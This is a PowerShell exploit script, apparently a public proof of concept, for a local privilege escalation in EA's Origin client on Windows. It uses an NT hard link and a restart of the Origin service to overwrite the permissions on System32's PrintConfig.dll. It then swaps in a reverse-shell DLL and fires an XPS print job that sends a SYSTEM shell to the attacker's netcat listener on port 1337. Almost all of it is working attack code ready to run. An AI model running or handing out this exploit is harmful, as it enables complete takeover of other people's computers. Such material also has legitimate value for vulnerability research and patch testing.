## EA's ORIGIN Client DACL Permission Overwrite local Privilege Escalation
## @404death


##  Please make sure that you run netcat : nc -lvp 1337


##  REF: https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Native-HardLink.ps1
##     : https://github.com/sailay1996/FileWrite2system

function Native-HardLink {
<#
.SYNOPSIS
	This is a proof-of-concept for NT hard links. There are some advantages, from an offensive
	perspective, to using NtSetInformationFile to create hard links (as opposed to
	mklink/CreateHardLink). NtSetInformationFile allows us link to files we donâ€™t have write
	access to. In the script I am performing some steps which are not strictly speaking
	necessary, like using GetFullPathName for path resolution, I have done this mostly to
	educate myself.
	Be smart, you can create a hard linkâ€™s which you wonâ€™t be able to delete afterwards donâ€™t
	shoot yourself in the foot.
	Resources:
		- https://github.com/google/symboliclink-testing-tools
		- https://googleprojectzero.blogspot.com/2015/12/between-rock-and-hard-link.html
.DESCRIPTION
	Author: Ruben Boonen (@FuzzySec)
	License: BSD 3-Clause
	Required Dependencies: None
	Optional Dependencies: None
.PARAMETER Link
	The full path to hard link.
.PARAMETER Target
	The full path to the file we are linking to.
.EXAMPLE
	C:\PS> Native-HardLink -Link C:\Some\Path\Hard.Link -Target C:\Some\Path\Target.file
	True
#>

	[CmdletBinding()]
	param(
		[Parameter(Mandatory = $True)]
		[String]$Link,
		[Parameter(Mandatory = $True)]
		[String]$Target
	)

	# Native API Definitions
	Add-Type -TypeDefinition @"
	using System;
	using System.Diagnostics;
	using System.Runtime.InteropServices;
	using System.Security.Principal;
	[StructLayout(LayoutKind.Sequential)]
	public struct OBJECT_ATTRIBUTES
	{
		public Int32 Length;
		public IntPtr RootDirectory;
		public IntPtr ObjectName;
		public UInt32 Attributes;
		public IntPtr SecurityDescriptor;
		public IntPtr SecurityQualityOfService;
	}
	[StructLayout(LayoutKind.Sequential)]
	public struct IO_STATUS_BLOCK
	{
		public IntPtr Status;
		public IntPtr Information;
	}
	[StructLayout(LayoutKind.Sequential)]
	public struct UNICODE_STRING
	{
		public UInt16 Length;
		public UInt16 MaximumLength;
		public IntPtr Buffer;
	}
	[StructLayout(LayoutKind.Sequential,CharSet=CharSet.Unicode)]
	public struct FILE_LINK_INFORMATION
	{
		[MarshalAs(UnmanagedType.U1)]
		public bool ReplaceIfExists;
		public IntPtr RootDirectory;
		public UInt32 FileNameLength;
		[MarshalAs(UnmanagedType.ByValTStr,SizeConst=260)]
		public String FileName;
	}
	public static class NtHardLink
	{
		[DllImport("kernel32.dll", CharSet=CharSet.Ansi)]
		public static extern UInt32 GetFullPathName(
			String lpFileName,
			UInt32 nBufferLength,
			System.Text.StringBuilder lpBuffer,
			ref IntPtr FnPortionAddress);
		[DllImport("kernel32.dll")]
		public static extern bool CloseHandle(
			IntPtr hObject);
		[DllImport("ntdll.dll")]
		public static extern UInt32 NtOpenFile(
			ref IntPtr FileHandle,
			UInt32 DesiredAccess,
			ref OBJECT_ATTRIBUTES ObjAttr,
			ref IO_STATUS_BLOCK IoStatusBlock,
			UInt32 ShareAccess,
			UInt32 OpenOptions);
		[DllImport("ntdll.dll")]
		public static extern UInt32 NtSetInformationFile(
			IntPtr FileHandle,
			ref IO_STATUS_BLOCK IoStatusBlock,
			IntPtr FileInformation,
			UInt32 Length,
			UInt32 FileInformationClass);
	}
"@

	function Emit-UNICODE_STRING {
		param(
			[String]$Data
		)

		$UnicodeObject = New-Object UNICODE_STRING
		$UnicodeObject_Buffer = $Data
		[UInt16]$UnicodeObject.Length = $UnicodeObject_Buffer.Length*2
		[UInt16]$UnicodeObject.MaximumLength = $UnicodeObject.Length+1
		[IntPtr]$UnicodeObject.Buffer = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($UnicodeObject_Buffer)
		[IntPtr]$InMemoryStruct = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(16) # enough for x32/x64
		[system.runtime.interopservices.marshal]::StructureToPtr($UnicodeObject, $InMemoryStruct, $true)

		$InMemoryStruct
	}

	function Get-FullPathName {
		param(
			[String]$Path
		)

		$lpBuffer = New-Object -TypeName System.Text.StringBuilder
		$FnPortionAddress = [IntPtr]::Zero

		# Call to get buffer length
		$CallResult = [NtHardLink]::GetFullPathName($Path,1,$lpBuffer,[ref]$FnPortionAddress)

		if ($CallResult -ne 0) {
			# Set buffer length and re-call
			$lpBuffer.EnsureCapacity($CallResult)|Out-Null
			$CallResult = [NtHardLink]::GetFullPathName($Path,$lpBuffer.Capacity,$lpBuffer,[ref]$FnPortionAddress)
			$FullPath = "\??\" + $lpBuffer.ToString()
		} else {
			$FullPath = $false
		}

		# Return FullPath
		$FullPath
	}

	function Get-NativeFileHandle {
		param(
			[String]$Path
		)

		$FullPath = Get-FullPathName -Path $Path
		if ($FullPath) {
			# IO.* does not support full path name on Win7
			if (![IO.File]::Exists($Path)) {
				Write-Verbose "[!] Invalid file path specified.."
				$false
				Return
			}
		} else {
			Write-Verbose "[!] Failed to retrieve fully qualified path.."
			$false
			Return
		}

		# Prepare NtOpenFile params
		[IntPtr]$hFile = [IntPtr]::Zero
		$ObjAttr = New-Object OBJECT_ATTRIBUTES
		$ObjAttr.Length = [System.Runtime.InteropServices.Marshal]::SizeOf($ObjAttr)
		$ObjAttr.ObjectName = Emit-UNICODE_STRING -Data $FullPath
		$ObjAttr.Attributes = 0x40
		$IoStatusBlock = New-Object IO_STATUS_BLOCK

		# DesiredAccess = MAXIMUM_ALLOWED; ShareAccess = FILE_SHARE_READ
		$CallResult = [NtHardLink]::NtOpenFile([ref]$hFile,0x02000000,[ref]$ObjAttr,[ref]$IoStatusBlock,0x1,0x0)
		if ($CallResult -eq 0) {
			$Handle = $hFile
		} else {
			Write-Verbose "[!] Failed to acquire file handle, NTSTATUS($('{0:X}' -f $CallResult)).."
			$Handle = $false
		}

		# Return file handle
		$Handle
	}

	function Create-NtHardLink {
		param(
			[String]$Link,
			[String]$Target
		)

		$LinkFullPath = Get-FullPathName -Path $Link
		# IO.* does not support full path name on Win7
		$LinkParent = [IO.Directory]::GetParent($Link).FullName
		if (![IO.Directory]::Exists($LinkParent)) {
			Write-Verbose "[!] Invalid link folder path specified.."
			$false
			Return
		}
		

		# Create pFileLinkInformation & IOStatusBlock struct
		$FileLinkInformation = New-Object FILE_LINK_INFORMATION
		$FileLinkInformation.ReplaceIfExists = $true
		$FileLinkInformation.FileName = $LinkFullPath
		$FileLinkInformation.RootDirectory = [IntPtr]::Zero
		$FileLinkInformation.FileNameLength = $LinkFullPath.Length * 2
		$FileLinkInformationLen = [System.Runtime.InteropServices.Marshal]::SizeOf($FileLinkInformation)
		$pFileLinkInformation = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($FileLinkInformationLen)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($FileLinkInformation, $pFileLinkInformation, $true)
		$IoStatusBlock = New-Object IO_STATUS_BLOCK

		# Get handle to target
		$hTarget = Get-NativeFileHandle -Path $Target
		if (!$hTarget) {
			$false
			Return
		}

		# FileInformationClass => FileLinkInformation = 0xB
		$CallResult = [NtHardLink]::NtSetInformationFile($hTarget,[ref]$IoStatusBlock,$pFileLinkInformation,$FileLinkInformationLen,0xB)
		if ($CallResult -eq 0) {
			$true
		} else {
			Write-Verbose "[!] Failed to create hardlink, NTSTATUS($('{0:X}' -f $CallResult)).."
		}

		# Free file handle
		$CallResult = [NtHardLink]::CloseHandle($hTarget)
	}

	# Create Hard Link
	Create-NtHardLink -Link $Link -Target $Target
}
echo " "
echo "[+] EA's ORIGIN Client DACL Permission Overwrite LPE By @404death"
$user=$env:UserName
$mypath = "C:\ProgramData\Origin\"
$targetfile="C:\Windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_e4ff50d4d5f8b2aa\Amd64\PrintConfig.dll"
echo "[+] Path : $mypath"
$NewVHDPath = $mypath+"local.xml"
echo "[+] VulnFile : $NewVHDPath"
remove-item -force $NewVHDPath
echo "[+] Creating link $NewVHDPath -> $targetfile"
Native-HardLink $NewVHDPath $targetfile |findstr "False"
echo "[+] Wait a bit to create permission on Target File"
echo "[+] Restarting the Service ..."
Get-Service "origin Web helper service" | Stop-Service
Get-Service "origin Web helper service" | Start-Service
Start-Sleep -s 3
echo "[+] New permission on target: $targetfile"
echo "######"
get-acl $targetfile |fl|findstr Access
echo "######"
echo "[+] Please make sure that you run netcat : nc -lvp 1337"
Start-Sleep -s 3
Copy-Item ".\rev_64.dll" -Destination "C:\Windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_e4ff50d4d5f8b2aa\Amd64\PrintConfig.dll" -Force
echo "[+] Spawnning SYSTEM shell sent to your Netcat ..."
$mycode = @"
using System;
using System.ComponentModel;
using System.IO;
using System.Runtime.InteropServices;
namespace XPS
{
public class XpsPrint
{
public static void StartPrintJob()
{
PrintJob("Microsoft XPS Document Writer", "myjob");
}
public static void PrintJob(string printerName, string jobName)
{
IntPtr completionEvent = CreateEvent(IntPtr.Zero, true, false, null);
if (completionEvent == IntPtr.Zero)
throw new Win32Exception();
try
{
IXpsPrintJob job;
IXpsPrintJobStream jobStream;
StartJob(printerName, jobName, completionEvent, out job, out jobStream);
jobStream.Close();


}
finally
{
if (completionEvent != IntPtr.Zero)
CloseHandle(completionEvent);
}
}
private static void StartJob(string printerName, string jobName, IntPtr completionEvent, out IXpsPrintJob job, out IXpsPrintJobStream jobStream)
{
int result = StartXpsPrintJob(printerName, jobName, null, IntPtr.Zero, completionEvent,
null, 0, out job, out jobStream, IntPtr.Zero);

}
[DllImport("XpsPrint.dll", EntryPoint = "StartXpsPrintJob")]
private static extern int StartXpsPrintJob(
[MarshalAs(UnmanagedType.LPWStr)] String printerName,
[MarshalAs(UnmanagedType.LPWStr)] String jobName,
[MarshalAs(UnmanagedType.LPWStr)] String outputFileName,
IntPtr progressEvent, 
IntPtr completionEvent, 
[MarshalAs(UnmanagedType.LPArray)] byte[] printablePagesOn,
UInt32 printablePagesOnCount,
out IXpsPrintJob xpsPrintJob,
out IXpsPrintJobStream documentStream,
IntPtr printTicketStream); 
[DllImport("Kernel32.dll", SetLastError = true)]
private static extern IntPtr CreateEvent(IntPtr lpEventAttributes, bool bManualReset, bool bInitialState, string lpName);
[DllImport("Kernel32.dll", SetLastError = true, ExactSpelling = true)]
private static extern WAIT_RESULT WaitForSingleObject(IntPtr handle, Int32 milliseconds);
[DllImport("Kernel32.dll", SetLastError = true)]
[return: MarshalAs(UnmanagedType.Bool)]
private static extern bool CloseHandle(IntPtr hObject);
}
[Guid("0C733A30-2A1C-11CE-ADE5-00AA0044773D")] 
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IXpsPrintJobStream
{
void Read([MarshalAs(UnmanagedType.LPArray)] byte[] pv, uint cb, out uint pcbRead);
void Write([MarshalAs(UnmanagedType.LPArray)] byte[] pv, uint cb, out uint pcbWritten);
void Close();
}
[Guid("5ab89b06-8194-425f-ab3b-d7a96e350161")]
[InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
interface IXpsPrintJob
{
void Cancel();
void GetJobStatus(out XPS_JOB_STATUS jobStatus);
}
[StructLayout(LayoutKind.Sequential)]
struct XPS_JOB_STATUS
{
public UInt32 jobId;
public Int32 currentDocument;
public Int32 currentPage;
public Int32 currentPageTotal;
public XPS_JOB_COMPLETION completion;
public Int32 jobStatus; 
};
enum XPS_JOB_COMPLETION
{
XPS_JOB_IN_PROGRESS = 0,
XPS_JOB_COMPLETED = 1,
XPS_JOB_CANCELLED = 2,
XPS_JOB_FAILED = 3
}
enum WAIT_RESULT
{
WAIT_OBJECT_0 = 0,
WAIT_ABANDONED = 0x80,
WAIT_TIMEOUT = 0x102,
WAIT_FAILED = -1 
}
}

"@
add-type -typeDefinition $mycode
try { [XPS.XpsPrint]::StartPrintJob() }
catch { "[+] You g0t SYSTEM !" }
echo "[+] pwned !"
echo ""
exit

